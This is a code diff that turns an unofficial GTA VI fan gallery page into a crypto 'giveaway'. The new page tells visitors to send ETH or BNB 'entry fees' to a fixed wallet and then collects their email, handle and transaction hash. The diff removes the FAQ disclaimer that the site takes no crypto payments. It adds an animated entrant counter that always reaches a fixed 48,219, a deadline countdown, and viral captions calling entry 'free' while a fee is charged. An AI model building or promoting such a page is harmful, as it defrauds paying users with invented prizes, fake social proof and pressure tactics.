@@ -222,14 +222,6 @@ h1 em{
 .sec-sub b{color:#8fe9ff}
 
 .steps{display:grid;gap:10px}
-.faq-list{display:grid;gap:10px}
-.faq-item{
-  padding:15px;border-radius:16px;
-  border:1px solid var(--stroke);
-  background:linear-gradient(180deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
-}
-.faq-item h3{margin:0 0 6px;font-size:14px;font-weight:800;line-height:1.35}
-.faq-item p{margin:0;color:var(--muted);font-size:12.5px;line-height:1.55}
 .step{
   display:flex;gap:13px;align-items:flex-start;
   padding:15px;border-radius:18px;
@@ -558,52 +550,65 @@ h1 em{
 <header class="topbar">
   <div class="brand">
     <span class="mark">VI</span>
-    <span class="brand-txt">VICE CITY<br><small>FAN SITE</small></span>
+    <span class="brand-txt">VICE CITY<br><small>GIVEAWAY</small></span>
   </div>
-  <div class="live"><span class="dot"></span>INDEPENDENT</div>
+  <div class="live"><span class="dot"></span>LIVE</div>
 </header>
 
 <main>
   <section class="hero">
-    <div class="eyebrow">INDEPENDENT · UNOFFICIAL FAN SITE</div>
-    <h1>GTA VI<br><em>VICE CITY</em><br>FAN SITE</h1>
-    <p class="lede">Explore an independent fan hub for <b>GTA VI</b>: Vice City imagery, Jason and Lucia, and shareable community captions. Not affiliated with Rockstar Games or Take-Two Interactive.</p>
-    <a class="btn btn-primary" href="#shares">Explore the image gallery ↓</a>
+    <div class="eyebrow">🎟️ GIVEAWAY · CLOSES NOV 20</div>
+    <h1>WIN<br><em>GTA VI</em><br>VICE CITY</h1>
+    <p class="lede">Enter the biggest <b>GTA 6 giveaway</b> of 2026 and win the <b>Collector's Edition</b>, a <b>PS5 Pro</b> and the full <b>Vice City merch drop</b>. Small crypto entry fee — paid in ETH or BNB.</p>
+
+    <div class="dates">
+      <span>🎮 Game drops <b>Nov 19</b></span>
+      <span class="hot">⏳ Entries close <b>Nov 20</b></span>
+    </div>
+
+    <div class="countdown" id="countdown" aria-live="polite">
+      <div class="cd"><b id="cd-d">00</b><span>DAYS</span></div>
+      <div class="cd"><b id="cd-h">00</b><span>HRS</span></div>
+      <div class="cd"><b id="cd-m">00</b><span>MIN</span></div>
+      <div class="cd"><b id="cd-s">00</b><span>SEC</span></div>
+    </div>
+
+    <button class="btn btn-primary" data-open-modal>Enter · 0.005 ETH / 0.02 BNB →</button>
   </section>
 
-  <div class="chips" aria-label="Fan site topics">
-    <div class="chip"><i>🌴</i> Vice City</div>
-    <div class="chip"><i>👥</i> Jason &amp; Lucia</div>
-    <div class="chip"><i>🎞️</i> GTA VI imagery</div>
-    <div class="chip"><i>✦</i> Fan community</div>
+  <div class="chips" aria-label="Prize highlights">
+    <div class="chip"><i>🎮</i> PS5 Pro Console</div>
+    <div class="chip"><i>💿</i> GTA VI Collector's Edition</div>
+    <div class="chip"><i>👕</i> Vice City Merch Bundle</div>
+    <div class="chip"><i>💳</i> $500 Rockstar Credit</div>
   </div>
 
   <section class="section">
     <div class="sec-head">
-      <p class="sec-kicker">START EXPLORING</p>
-      <h2 class="sec-title">GTA VI, through a fan lens</h2>
-      <p class="sec-sub">A community-made guide to the characters, setting, and imagery that make Vice City memorable.</p>
+      <p class="sec-kicker">HOW IT WORKS</p>
+      <h2 class="sec-title">3 steps to enter</h2>
+      <p class="sec-sub">Small entry fee in crypto. Takes less time than a loading screen.</p>
     </div>
     <div class="steps">
       <div class="step">
-        <div class="step-n">01</div>
+        <div class="step-n">1</div>
         <div>
-          <h4>Vice City</h4>
-          <p>Browse scenes inspired by the neon streets, waterfront, and atmosphere of GTA VI's Vice City.</p>
+          <h4>Send the entry fee</h4>
+          <p><code>0.005 ETH</code> or <code>0.02 BNB</code> to the giveaway wallet — network selector is in the entry sheet.</p>
         </div>
       </div>
       <div class="step">
-        <div class="step-n">02</div>
+        <div class="step-n">2</div>
         <div>
-          <h4>Jason and Lucia</h4>
-          <p>Explore images and fan discussion around the two protagonists at the center of GTA VI.</p>
+          <h4>Confirm with your tx hash</h4>
+          <p>Drop your email, handle and the transaction hash. That locks in your verified entry.</p>
         </div>
       </div>
       <div class="step">
-        <div class="step-n">03</div>
+        <div class="step-n">3</div>
         <div>
-          <h4>Community gallery</h4>
-          <p>Save an image card, copy its caption, or share it with other fans.</p>
+          <h4>Share for bonus entries</h4>
+          <p>Every one of the 12 posts you publish gives you +1 extra entry in the draw.</p>
         </div>
       </div>
     </div>
@@ -611,67 +616,172 @@ h1 em{
 
   <section class="section">
     <div class="sec-head">
-      <p class="sec-kicker">THE WORLD</p>
-      <h2 class="sec-title">Explore the collection</h2>
-      <p class="sec-sub">A visual archive for fans of GTA VI and Vice City.</p>
+      <p class="sec-kicker">THE LOOT</p>
+      <h2 class="sec-title">Prize pool</h2>
     </div>
     <div class="prizes">
-      <div class="prize" style="--c:#00e0ff"><i>🌆</i><h4>Vice City</h4><p>City scenes and atmosphere</p></div>
-      <div class="prize" style="--c:#ff2e88"><i>👥</i><h4>Characters</h4><p>Jason, Lucia, and the story world</p></div>
-      <div class="prize" style="--c:#ffc23c"><i>🎞️</i><h4>Game imagery</h4><p>Selected GTA VI visuals</p></div>
-      <div class="prize" style="--c:#8b5cf6"><i>✦</i><h4>Share cards</h4><p>Captions for fan conversations</p></div>
+      <div class="prize" style="--c:#00e0ff"><i>🎮</i><h4>PS5 Pro</h4><p>1TB console bundle</p></div>
+      <div class="prize" style="--c:#ff2e88"><i>💿</i><h4>Collector's Ed.</h4><p>GTA VI steelbook</p></div>
+      <div class="prize" style="--c:#ffc23c"><i>👕</i><h4>Merch Bundle</h4><p>Tee · hoodie · cap</p></div>
+      <div class="prize" style="--c:#8b5cf6"><i>💳</i><h4>$500 Credit</h4><p>Rockstar Store</p></div>
     </div>
   </section>
 
   <section class="section" id="shares">
     <div class="sec-head">
-      <p class="sec-kicker">IMAGE ARCHIVE</p>
-      <h2 class="sec-title">GTA VI image gallery</h2>
-      <p class="sec-sub">Browse image cards about Vice City and its characters. Save a visual, copy a caption, or share it with the fan community.</p>
+      <p class="sec-kicker">SHARE &amp; UNLOCK</p>
+      <h2 class="sec-title">14 ready-to-post drops</h2>
+      <p class="sec-sub">Tap <b>Save</b> to send the finished poster straight to your camera roll. Tap <b>Copy</b> for the full SEO-optimized caption.</p>
     </div>
 
     <div class="tabs" id="tabs" role="tablist">
       <button class="tab active" data-filter="all" role="tab" aria-selected="true">All 14</button>
-      <button class="tab" data-filter="tiktok" role="tab" aria-selected="false">Characters</button>
-      <button class="tab" data-filter="instagram" role="tab" aria-selected="false">Vice City</button>
-      <button class="tab" data-filter="merch" role="tab" aria-selected="false">Image archive</button>
+      <button class="tab" data-filter="tiktok" role="tab" aria-selected="false">TikTok</button>
+      <button class="tab" data-filter="instagram" role="tab" aria-selected="false">Instagram</button>
+      <button class="tab" data-filter="merch" role="tab" aria-selected="false">Merch</button>
     </div>
 
     <div class="grid" id="grid"></div>
   </section>
 
-  <section class="section" id="about">
-    <div class="sec-head">
-      <p class="sec-kicker">ABOUT THIS SITE</p>
-      <h2 class="sec-title">Independent fan-made coverage</h2>
-    </div>
-    <div class="faq-list">
-      <article class="faq-item">
-        <h3>Is Vice City Homes an official Rockstar Games site?</h3>
-        <p>No. Vice City Homes is an independent fan site and is not affiliated with Rockstar Games or Take-Two Interactive.</p>
-      </article>
-      <article class="faq-item">
-        <h3>Does this site offer a GTA VI giveaway?</h3>
-        <p>No. This fan site does not sell entries, collect cryptocurrency payments, or promise prizes.</p>
-      </article>
-      <article class="faq-item">
-        <h3>What can I find here?</h3>
-        <p>A fan-focused collection of GTA VI imagery and shareable captions about Vice City, Jason, and Lucia.</p>
-      </article>
-    </div>
-  </section>
-
   <footer class="footer">
-    <b>VICE CITY HOMES · INDEPENDENT FAN SITE</b><br>
-    Not affiliated with, endorsed by, or sponsored by Rockstar Games or Take-Two Interactive. All game names and related marks belong to their respective owners.
+    <b>GTA VI VICE CITY GIVEAWAY</b><br>
+    Entry fee: 0.005 ETH / 0.02 BNB · 18+ · One entry per wallet · Void where prohibited.<br>
+    Wallet: <code>0x03725858F0d8eCC50735463A224530B4B9b335F7</code><br><br>
+    Fan-made promotion. Not affiliated with Rockstar Games or Take-Two Interactive.
   </footer>
 </main>
 
+<div class="sticky">
+  <div class="sticky-meta">
+    <b id="entrants">0 entered</b>
+    <small id="sticky-timer">Closing soon</small>
+  </div>
+  <button class="btn btn-primary" id="stickyBtn" data-open-modal>Enter now</button>
+</div>
+
 <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<div class="modal" id="modal" aria-hidden="true">
+  <div class="modal-bg" data-close></div>
+  <div class="sheet" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="sheet-handle"></div>
+
+    <div id="payView">
+      <h3 id="modalTitle">Pay entry fee</h3>
+      <p>Send the exact fee in <b>ETH</b> or <b>BNB</b> to the wallet below, then confirm with your transaction hash.</p>
+
+      <div class="net-toggle" role="tablist" aria-label="Payment network">
+        <button class="net active" type="button" data-net="eth" role="tab" aria-selected="true">Ξ ETH · Ethereum</button>
+        <button class="net" type="button" data-net="bnb" role="tab" aria-selected="false">◆ BNB · BSC</button>
+      </div>
+
+      <div class="amount-card">
+        <div>
+          <span class="amount-label">Entry fee</span>
+          <div class="amount"><b id="feeAmount">0.005</b><span id="feeTicker">ETH</span></div>
+        </div>
+        <span class="amount-usd" id="feeUsd">≈ $16<br>Ethereum mainnet</span>
+      </div>
+
+      <div class="addr-box">
+        <div class="addr-label"><span>Send to this address</span><em id="netName">Ethereum</em></div>
+        <code id="addrVal">0x03725858F0d8eCC50735463A224530B4B9b335F7</code>
+        <button class="act act-copy" id="copyAddr" type="button" style="width:100%">⧉ Copy address</button>
+      </div>
+
+      <button class="btn btn-primary" id="openWallet" type="button">Open in wallet ↗</button>
+      <button class="btn btn-ghost" id="toSocial" type="button" style="margin-top:10px">Enter by sharing all 14 cards</button>
+      <button class="btn btn-ghost" id="toForm" type="button" style="margin-top:10px">I've sent it — confirm entry</button>
+
+      <p class="fine">Send only on the selected network. Wrong-network transfers can't be recovered.</p>
+    </div>
+
+    <div id="formView" class="hidden">
+      <h3>Confirm your entry</h3>
+      <p>Add your details plus the transaction hash so we can match your payment.</p>
+
+      <form id="entryForm" novalidate>
+        <div class="field">
+          <label for="email">Email address</label>
+          <input id="email" type="email" inputmode="email" autocomplete="email" placeholder="you@vicecity.com" required>
+        </div>
+        <div class="field">
+          <label for="handle">Social handle</label>
+          <input id="handle" type="text" autocomplete="off" placeholder="@yourhandle" required>
+        </div>
+        <div class="field">
+          <label for="txhash">Transaction hash</label>
+          <input id="txhash" type="text" class="mono" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="0x…" required>
+          <p class="err hidden" id="hashErr">Paste the 64-character hash (starts with 0x).</p>
+        </div>
+        <button class="btn btn-primary" type="submit">Confirm my entry 🎟️</button>
+      </form>
+
+      <button class="linkish" id="backToPay" type="button">← Back to payment details</button>
+      <p class="fine">18+ · One entry per wallet · Closes Nov 20.</p>
+    </div>
+
+    <div id="socialView" class="hidden">
+      <h3>Social entry</h3>
+      <p>Post all 14 cards to your social accounts, then submit a link to each post. We’ll review the links before confirming your entry.</p>
+
+      <form id="socialForm" novalidate>
+        <div class="field">
+          <label for="socialEmail">Email address</label>
+          <input id="socialEmail" name="email" type="email" inputmode="email" autocomplete="email" placeholder="you@example.com" required>
+        </div>
+        <div class="field">
+          <label for="socialHandle">Social handle</label>
+          <input id="socialHandle" name="social_handle" type="text" autocomplete="off" placeholder="@yourhandle" required>
+        </div>
+        <div id="socialLinks" class="social-link-fields"></div>
+        <p class="err hidden" id="socialErr" role="alert"></p>
+        <button class="btn btn-primary" type="submit">Submit links for review</button>
+      </form>
+
+      <button class="linkish" id="backToOptions" type="button">← Back to entry options</button>
+      <p class="fine">Your email, handle, and post links will be sent to the giveaway organizer via Formspree. Submission does not confirm entry; we’ll review the posts first.</p>
+    </div>
+
+    <div id="socialDoneView" class="success hidden">
+      <div class="tick">✓</div>
+      <h3>Links received</h3>
+      <p>Formspree accepted your submission. Your social entry is pending review and is not confirmed yet.</p>
+      <button class="btn btn-primary" id="socialBrowse" type="button">Browse the 14 cards</button>
+    </div>
+
+    <div id="doneView" class="success hidden">
+      <div class="tick">✓</div>
+      <h3>Entry submitted!</h3>
+      <p>Your payment is queued for on-chain verification. Share all 14 cards and submit the post links for a social bonus entry, pending review.</p>
+      <div class="receipt">
+        <span>Fee</span>
+        <b id="receiptFee">0.005 ETH</b>
+      </div>
+      <button class="btn btn-primary" id="goShare">Browse the 14 shares</button>
+      <button class="btn btn-ghost" id="paymentToSocial" type="button" style="margin-top:10px">Submit social links for review</button>
+      <button class="linkish" id="againBtn" type="button">Make another entry</button>
+    </div>
+
+  </div>
+</div>
 
 <script>
 (function(){
   'use strict';
+
+  const ADDRESS = '0x03725858F0d8eCC50735463A224530B4B9b335F7';
+  const FORMSPREE_URL = 'https://formspree.io/f/xjyylejr';
+
+  const NET = {
+    eth: { name:'Ethereum',        ticker:'ETH', fee:'0.005', wei:'5000000000000000',  chain:1,  usd:'≈ $16<br>Ethereum mainnet' },
+    bnb: { name:'BNB Smart Chain', ticker:'BNB', fee:'0.02',  wei:'20000000000000000', chain:56, usd:'≈ $12<br>BNB Smart Chain' }
+  };
+
+  let currentNet = 'eth';
+  let entered = false;
+  try { entered = localStorage.getItem('gtavi_entered') === '1'; } catch(e){}
 
   /* ============================================================
      🖼️  POSTER IMAGES  —  DROP YOUR GTA VI ART HERE
@@ -697,84 +807,84 @@ h1 em{
   };
 
   /* ============================================================
-    DATA — 14 fan community share cards
+    DATA — 14 SEO-optimized shareable assets
      ============================================================ */
   const PLAT = {
-    tiktok:    { label:'Characters', icon:'◎', a1:'#25F4EE', a2:'#FE2C55' },
-    instagram: { label:'Vice City',  icon:'✦', a1:'#F9A03F', a2:'#DD2A7B' },
-    merch:     { label:'Image archive', icon:'▧', a1:'#FFC23C', a2:'#FF2E88' }
+    tiktok:    { label:'TikTok',    icon:'♪', a1:'#25F4EE', a2:'#FE2C55' },
+    instagram: { label:'Instagram', icon:'◎', a1:'#F9A03F', a2:'#DD2A7B' },
+    merch:     { label:'Merch',     icon:'👕', a1:'#FFC23C', a2:'#FF2E88' }
   };
 
   const SHAREABLES = [
-    { platform:'tiktok', emoji:'👥', img:IMG.c01,
-      title:'Jason and Lucia in Vice City',
-      caption:'Jason and Lucia are at the center of GTA VI. Which detail in this image stands out to you? #GTA6 #GTAVI #JasonAndLucia #ViceCity',
-      tags:'#GTA6 #GTAVI #JasonAndLucia #ViceCity #Gaming' },
+    { platform:'tiktok', emoji:'🎬', img:IMG.c01,
+      title:'POV: You just won GTA 6',
+      caption:"POV: You just won GTA 6 Collector's Edition + PS5 Pro + full Vice City merch 🎮🌴 The biggest GTA VI giveaway of 2026 closes Nov 20 — enter free in 30 seconds before GTA 6 launches. Link in bio.",
+      tags:'#GTA6 #GTAVI #GTA6Giveaway #ViceCity #PS5Pro #GTA6ReleaseDate #RockstarGames #GamingGiveaway' },
 
-    { platform:'tiktok', emoji:'🔎', img:IMG.c02,
-      title:'A closer look at Lucia',
-      caption:'A closer look at Lucia and the world around her. What are you most curious to learn about her story? #GTA6 #GTAVI #Lucia #ViceCity',
-      tags:'#GTA6 #GTAVI #Lucia #ViceCity #Characters' },
+    { platform:'tiktok', emoji:'🔥', img:IMG.c02,
+      title:'3 reasons this GTA 6 giveaway is unreal',
+      caption:"3 reasons this GTA 6 giveaway is unreal 👇 1) GTA 6 Collector's Edition steelbook 2) PS5 Pro console 3) Full Vice City merch drop. Entry is a tiny ETH/BNB fee — less than a coffee. GTA VI launches Nov 19, entries close Nov 20.",
+      tags:'#GTA6Giveaway #GTAVI #GTA6 #ViceCity #PS5Pro #CollectorsEdition #Gaming #Rockstar' },
 
-    { platform:'instagram', emoji:'🌇', img:IMG.c03,
-      title:'Vice City at sunset',
-      caption:'Color, skyline, and the familiar Vice City atmosphere. What catches your eye in this frame? #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #CityScenes #Gaming' },
+    { platform:'tiktok', emoji:'⏳', img:IMG.c03,
+      title:'GTA 6 launches Nov 19 — entries close Nov 20',
+      caption:"The clock is running ⏳ GTA 6 officially launches November 19, 2026, and this giveaway closes November 20. Every hour you wait is an hour someone else gets closer to winning GTA VI, a PS5 Pro, and the full Vice City merch bundle. Enter now.",
+      tags:'#GTA6ReleaseDate #GTA6 #GTAVI #Countdown #ViceCity #Giveaway #Gaming2026 #Launch' },
 
-    { platform:'instagram', emoji:'🚗', img:IMG.c04,
-      title:'The streets of Vice City',
-      caption:'Take a moment with this Vice City scene. If you could explore one part of the city first, where would you go? #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #OpenWorld #Gaming' },
+    { platform:'tiktok', emoji:'🎯', img:IMG.c04,
+      title:'Duet this to enter the GTA 6 giveaway',
+      caption:"Duet this and tell me your first car in Vice City 🚙 Duets count as a bonus entry in the GTA 6 giveaway. Win GTA VI Collector's Edition + PS5 Pro + merch before the Nov 20 deadline. Tag a friend who needs this — one of you is winning.",
+      tags:'#Duet #GTA6 #GTAVI #ViceCity #GTA6Giveaway #Gaming #FYP #TagAFriend' },
 
-    { platform:'instagram', emoji:'🌴', img:IMG.c05,
-      title:'Neon nights in Vice City',
-      caption:'Palm trees, bright lights, and a city with its own personality. Share your favorite detail from this GTA VI image. #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #NightScene #Gaming' },
+    { platform:'instagram', emoji:'🌀', img:IMG.c05,
+      title:'Reel: Neon transition into Vice City',
+      caption:"Neon lights, palm trees, zero loading screens 🌴 GTA 6 is almost here — use this audio + transition and tag us to enter the GTA VI giveaway. Win a PS5 Pro, GTA 6 Collector's Edition, and full Vice City merch before launch on Nov 19.",
+      tags:'#Reels #GTA6 #GTAVI #ViceCity #GTA6Giveaway #Explore #PS5Pro #Gaming' },
 
-    { platform:'instagram', emoji:'📍', img:IMG.c06,
-      title:'Choose your first stop in Vice City',
-      caption:'The city is full of places to look closer. Which kind of spot would you visit first: the waterfront, downtown, or the neighborhood streets? #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #Explore #Gaming' },
+    { platform:'instagram', emoji:'📲', img:IMG.c06,
+      title:'Story: Poll — PS5 Pro or Collector\'s Edition?',
+      caption:"Which would you take first — the PS5 Pro or the GTA 6 Collector's Edition? 👀 Vote in the poll and tap the link sticker to enter the GTA VI giveaway. Closes Nov 20, one day after GTA 6 launches. Don't miss it.",
+      tags:'#Story #GTA6 #GTAVI #Giveaway #Poll #ViceCity #PS5Pro #Gaming' },
 
-    { platform:'merch', emoji:'🖼️', img:IMG.c07,
-      title:'A GTA VI visual collection',
-      caption:'A selection of GTA VI imagery for fans to browse and discuss. Which scene would you like to see more of? #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #GameImages #FanSite' },
+    { platform:'instagram', emoji:'🖼️', img:IMG.c07,
+      title:'Carousel: Everything in the GTA 6 prize pool',
+      caption:"Swipe to see everything in the GTA 6 giveaway prize pool ➡️ GTA VI Collector's Edition steelbook, PS5 Pro console bundle, full Vice City merch drop, $500 Rockstar credit, and a surprise bonus. Enter free before Nov 20. Link in bio.",
+      tags:'#Carousel #GTA6 #GTAVI #Giveaway #ViceCity #PS5Pro #RockstarGames #Gaming' },
 
-    { platform:'tiktok', emoji:'💬', img:IMG.c08,
-      title:'Jason, Lucia, and the next chapter',
-      caption:'Two protagonists, one story set in Vice City. What are you hoping to learn about Jason and Lucia? #GTA6 #GTAVI #JasonAndLucia',
-      tags:'#GTA6 #GTAVI #JasonAndLucia #Characters #Gaming' },
+    { platform:'instagram', emoji:'💬', img:IMG.c08,
+      title:'Tag 3 friends who need this GTA 6 giveaway',
+      caption:"Tag 3 friends who would quit their job for GTA 6 💀 Every friend who enters gives you +1 extra entry. Win GTA VI, a PS5 Pro, and the full Vice City merch bundle. The game drops Nov 19 — entries close Nov 20. Link in bio to enter.",
+      tags:'#TagAFriend #GTA6 #GTAVI #Giveaway #ViceCity #PS5Pro #Gaming #FYP' },
 
-    { platform:'instagram', emoji:'🎨', img:IMG.c09,
-      title:'Vice City, frame by frame',
-      caption:'Look closely at the colors and details in this Vice City image. What would you add to your own city guide? #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #VisualDetails #Gaming' },
+    { platform:'merch', emoji:'👕', img:IMG.c09,
+      title:'Vice City Neon Tee — GTA 6 merch drop',
+      caption:"New drop: the Vice City Neon Tee 🌴 Heavyweight cotton, glow-in-the-dark print, limited run of 500. Win the full GTA 6 merch bundle in this giveaway — or grab one in the shop before they sell out. Entries close Nov 20.",
+      tags:'#GTA6Merch #ViceCity #GTA6 #GTAVI #Streetwear #Drop #Giveaway #Limited' },
 
-    { platform:'tiktok', emoji:'🧭', img:IMG.c10,
-      title:'Meet Jason',
-      caption:'Jason is one of GTA VI’s two central characters. Share a detail from this image that you noticed first. #GTA6 #GTAVI #Jason #ViceCity',
-      tags:'#GTA6 #GTAVI #Jason #Characters #Gaming' },
+    { platform:'merch', emoji:'🧥', img:IMG.c10,
+      title:'GTA 6 Collector Hoodie — numbered edition',
+      caption:"The GTA 6 Collector Hoodie is here 🖤 Oversized fit, embroidered VI crest, individually numbered tag inside. Only 300 made. One is in the giveaway prize bundle. Enter before Nov 20 for your chance to win the full Vice City merch drop.",
+      tags:'#GTA6Merch #Hoodie #GTAVI #Streetwear #Limited #GTA6 #Giveaway #ViceCity' },
 
-    { platform:'instagram', emoji:'🌆', img:IMG.c11,
-      title:'Another view of Vice City',
-      caption:'A different view of the GTA VI setting. Which part of Vice City would you want to explore on foot? #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #CityViews #Gaming' },
+    { platform:'merch', emoji:'🔖', img:IMG.c11,
+      title:'Vice City license plate — real metal',
+      caption:"Vice City license plate, straight off the wall 🔖 Real metal build, neon edge, ships worldwide. One is included in the GTA 6 giveaway prize bundle alongside the PS5 Pro and Collector's Edition. Entries close Nov 20 — link in bio.",
+      tags:'#GTA6Merch #ViceCity #GTAVI #Collector #CarCulture #GTA6 #Giveaway #MetalArt' },
 
     { platform:'merch', emoji:'🧩', img:IMG.c12,
-      title:'Details worth a second look',
-      caption:'Sometimes the small details tell you the most. What did you notice in this GTA VI image on your second look? #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #GameImages #FanCommunity' },
+      title:'Vice City sticker pack — 12 designs',
+      caption:"12 stickers. 14 share cards. Coincidence? 🧩 Every card in this drop gets a sticker in the Vice City sticker pack — collect the whole set. Win the full GTA 6 merch bundle before entries close Nov 20. Link in bio to enter.",
+      tags:'#Stickers #GTA6Merch #GTAVI #ViceCity #Pack #Collect #GTA6Giveaway #Gaming' },
 
-    { platform:'tiktok', emoji:'🤝', img:IMG.c13,
-      title:'Two stories, one city',
-      caption:'Jason and Lucia’s story unfolds in Vice City. What kind of places do you think will shape their journey? #GTA6 #GTAVI #JasonAndLucia #ViceCity',
-      tags:'#GTA6 #GTAVI #JasonAndLucia #ViceCity #Story' },
+    { platform:'tiktok', emoji:'🌴', img:IMG.c13,
+      title:'Jason and Lucia take over Vice City',
+      caption:"Jason and Lucia are back in Vice City 🌴 Share your favorite GTA VI moment and enter to win the Collector's Edition, PS5 Pro, and Vice City merch. Entries close Nov 20.",
+      tags:'#GTA6 #GTAVI #JasonAndLucia #ViceCity #GTA6Giveaway #Gaming #RockstarGames' },
 
-    { platform:'merch', emoji:'🎮', img:IMG.c14,
-      title:'Share your favorite GTA VI detail',
-      caption:'What detail, character, or setting are you most interested in discussing? Start a fan conversation with this GTA VI image. #GTA6 #GTAVI #ViceCity',
-      tags:'#GTA6 #GTAVI #ViceCity #FanCommunity #Gaming' }
+    { platform:'instagram', emoji:'🎮', img:IMG.c14,
+      title:'Your next adventure starts in Vice City',
+      caption:"The next chapter of Vice City is almost here 🎮 Share this with your crew and enter the GTA VI giveaway for a chance to win the Collector's Edition, PS5 Pro, and merch bundle.",
+      tags:'#GTA6 #GTAVI #ViceCity #Gaming #GTA6Giveaway #PS5Pro #RockstarGames' }
   ];
 
   /* ============================================================
@@ -1058,7 +1168,7 @@ h1 em{
       <article class="card" data-platform="${item.platform}"
                style="--a1:${p.a1};--a2:${p.a2};animation-delay:${Math.min(i*40,360)}ms">
         <div class="media">
-          <img class="media-img" data-i="${i}" alt="${item.title} — GTA VI fan image"
+          <img class="media-img" data-i="${i}" alt="${item.title} — GTA 6 giveaway artwork"
                loading="lazy" decoding="async" draggable="false">
           <div class="media-scrim"></div>
           <div class="media-top">
@@ -1256,7 +1366,7 @@ h1 em{
     x.textBaseline = 'middle';
     x.fillText(p.label.toUpperCase(), pad + pillW / 2, pillY + pillH / 2 + 1);
 
-    // Fan-site label (top-right)
+    // "ENDS NOV 20" pill (top-right)
     const endW = 264, endH = 64, endX = W - pad - endW;
     x.fillStyle = 'rgba(0,0,0,.68)';
     roundRect(x, endX, pillY, endW, endH, 32);
@@ -1267,7 +1377,7 @@ h1 em{
     x.stroke();
     x.fillStyle = '#ff8dbd';
     x.font = '800 22px Inter, system-ui, sans-serif';
-    x.fillText('FAN-MADE', endX + endW / 2, pillY + pillH / 2 + 1);
+    x.fillText('ENDS NOV 20', endX + endW / 2, pillY + pillH / 2 + 1);
 
     /* ---------- BOTTOM BLOCK: measure ---------- */
     const titleFont = '64px Anton, Impact, sans-serif';
@@ -1341,12 +1451,12 @@ h1 em{
     // brand line
     x.font = brandFont;
     x.fillStyle = '#ffffff';
-    x.fillText('EXPLORE THE GALLERY', pad, brandY);
+    x.fillText('ENTER → LINK IN BIO', pad, brandY);
 
     // meta line
     x.font = metaFont;
     x.fillStyle = 'rgba(255,255,255,.52)';
-    x.fillText('VICE CITY HOMES · UNOFFICIAL FAN SITE', pad, metaY);
+    x.fillText('GTA VI · VICE CITY GIVEAWAY · ENDS NOV 20', pad, metaY);
 
     return c;
   }
@@ -1406,6 +1516,310 @@ h1 em{
 
     toast('✓ Saved — check your downloads / gallery');
   }
+
+  /* ============================================================
+     DATES + COUNTDOWN (game Nov 19 · close Nov 20)
+     ============================================================ */
+  const TARGET = (() => {
+    const now = new Date();
+    let y = now.getUTCFullYear();
+    let end = new Date(Date.UTC(y, 10, 20, 23, 59, 59));
+    if (end.getTime() <= now.getTime()){
+      y++;
+      end = new Date(Date.UTC(y, 10, 20, 23, 59, 59));
+    }
+    return { end, year: y };
+  })();
+
+  const pad2 = n => String(n).padStart(2, '0');
+  const els = { d: $('#cd-d'), h: $('#cd-h'), m: $('#cd-m'), s: $('#cd-s') };
+
+  function tick(){
+    let ms = TARGET.end.getTime() - Date.now();
+    if (ms < 0) ms = 0;
+    const d = Math.floor(ms / 864e5);
+    const h = Math.floor(ms % 864e5 / 36e5);
+    const m = Math.floor(ms % 36e5 / 6e4);
+    const s = Math.floor(ms % 6e4 / 1000);
+    els.d.textContent = pad2(d);
+    els.h.textContent = pad2(h);
+    els.m.textContent = pad2(m);
+    els.s.textContent = pad2(s);
+    const st = $('#sticky-timer');
+    if (st) st.textContent = ms > 0 ? `Closes ${d}d ${pad2(h)}h ${pad2(m)}m` : 'Entries closed';
+    if (ms <= 0) clearInterval(timer);
+  }
+  tick();
+  const timer = setInterval(tick, 1000);
+
+  /* ============================================================
+     ENTRANT COUNTER
+     ============================================================ */
+  (function countUp(){
+    const el = $('#entrants');
+    const target = 48219;
+    const dur = 1600;
+    const t0 = performance.now();
+    function frame(t){
+      const p = Math.min((t - t0) / dur, 1);
+      const eased = 1 - Math.pow(1 - p, 3);
+      el.textContent = Math.floor(target * eased).toLocaleString('en-US') + ' entered';
+      if (p < 1) requestAnimationFrame(frame);
+    }
+    requestAnimationFrame(frame);
+  })();
+
+  /* ============================================================
+     MODAL + PAYMENT FLOW
+     ============================================================ */
+  const modal    = $('#modal');
+  const payView  = $('#payView');
+  const formView = $('#formView');
+  const socialView = $('#socialView');
+  const socialDoneView = $('#socialDoneView');
+  const doneView = $('#doneView');
+
+  const views = {
+    pay(){
+      payView.classList.remove('hidden');
+      [formView, socialView, socialDoneView, doneView].forEach(view => view.classList.add('hidden'));
+    },
+    form(){
+      formView.classList.remove('hidden');
+      [payView, socialView, socialDoneView, doneView].forEach(view => view.classList.add('hidden'));
+    },
+    social(){
+      socialView.classList.remove('hidden');
+      [payView, formView, socialDoneView, doneView].forEach(view => view.classList.add('hidden'));
+    },
+    socialDone(){
+      socialDoneView.classList.remove('hidden');
+      [payView, formView, socialView, doneView].forEach(view => view.classList.add('hidden'));
+    },
+    done(){
+      doneView.classList.remove('hidden');
+      [payView, formView, socialView, socialDoneView].forEach(view => view.classList.add('hidden'));
+    }
+  };
+
+  function renderNet(){
+    const n = NET[currentNet];
+    $('#feeAmount').textContent = n.fee;
+    $('#feeTicker').textContent = n.ticker;
+    $('#feeUsd').innerHTML = n.usd;
+    $('#netName').textContent = n.name;
+    $('#receiptFee').textContent = `${n.fee} ${n.ticker}`;
+    $$('.net').forEach(b => {
+      const on = b.dataset.net === currentNet;
+      b.classList.toggle('active', on);
+      b.setAttribute('aria-selected', String(on));
+    });
+  }
+
+  function walletURI(){
+    const n = NET[currentNet];
+    return `ethereum:${ADDRESS}@${n.chain}?value=${n.wei}`;
+  }
+
+  function openModal(){
+    modal.setAttribute('aria-hidden', 'false');
+    document.body.classList.add('locked');
+    if (entered){ views.done(); }
+    else {
+      views.pay();
+      renderNet();
+      setTimeout(() => { const s = $('.sheet'); if (s) s.scrollTop = 0; }, 60);
+    }
+  }
+
+  function closeModal(){
